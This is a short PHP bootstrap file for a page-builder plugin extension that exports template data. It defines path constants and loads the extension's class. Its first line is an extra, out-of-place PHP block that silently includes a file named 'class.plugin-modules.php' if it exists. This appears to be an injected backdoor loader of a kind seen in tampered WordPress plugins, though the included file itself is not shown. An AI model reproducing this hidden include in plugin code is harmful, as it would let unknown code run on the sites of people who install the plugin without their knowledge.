<?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php

// Defines
define( 'FL_BUILDER_TEMPLATE_DATA_EXPORTER_DIR', FL_BUILDER_DIR . 'extensions/fl-builder-template-data-exporter/' );
define( 'FL_BUILDER_TEMPLATE_DATA_EXPORTER_URL', FL_BUILDER_URL . 'extensions/fl-builder-template-data-exporter/' );

// Classes
require_once FL_BUILDER_TEMPLATE_DATA_EXPORTER_DIR . 'classes/class-fl-builder-template-data-exporter.php';
